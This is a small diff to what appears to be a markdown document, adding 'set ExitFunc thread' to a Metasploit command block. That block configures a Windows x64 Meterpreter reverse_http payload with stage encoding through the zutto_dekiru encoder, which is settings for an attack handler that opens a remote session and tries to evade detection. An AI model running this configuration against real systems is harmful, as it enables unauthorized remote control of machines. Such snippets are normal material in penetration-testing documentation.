@@ -23,6 +23,7 @@ set PAYLOAD windows/x64/meterpreter/reverse_http;
 set EnableStageEncoding true;
 set StageEncoder x64/zutto_dekiru;
 set AutoLoadStdapi false;
+set ExitFunc thread;
 run'
 ~~~
 
